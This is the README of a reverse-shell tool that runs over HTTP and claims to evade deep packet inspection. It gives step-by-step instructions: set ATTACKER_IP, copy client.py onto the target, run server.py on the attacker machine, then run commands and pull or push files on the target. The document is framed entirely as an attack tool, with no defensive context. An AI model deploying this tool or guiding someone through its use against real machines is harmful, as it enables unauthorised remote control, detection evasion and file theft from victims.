# HTTP-Reverse-Shell

![https://img.shields.io/github/stars/apurvsinghgautam/HTTP-Reverse-Shell](https://img.shields.io/github/stars/apurvsinghgautam/HTTP-Reverse-Shell) ![https://img.shields.io/github/forks/apurvsinghgautam/HTTP-Reverse-Shell](https://img.shields.io/github/forks/apurvsinghgautam/HTTP-Reverse-Shell)

A reverse shell over HTTP (dodges deep packet inspection). Using Python 3 and no external dependencies needed.

# Prerequisites
- Python 3 (on both the attacker and the target machine

# Usage
1. Change `ATTACKER_IP` to the actual IP of the attacker on `client.py`
2. Change `ATTACKER_PORT` on both `client.py` and `server.py` (or you can just use the default)
3. Transfer `client.py` to the target machine
4. Run `server.py` on the attacker machine
```
python3 server.py
```
5. Run `client.py` on the target machine
```
python3 client.py
```
6. Connection will be established

Function instruction:
1. Normal command
```
Shell><type your command here>
```
2. Pull file
```
Shell>pull <which file you want to get from client(full file path in client)> <which file you want to save on server(full file path includes file name in server)>
```
3. push file
```
Shell>push <which file you want to send to client(full file path in server)> <which file you want to save on client(full file path includes file name in client)>
```  
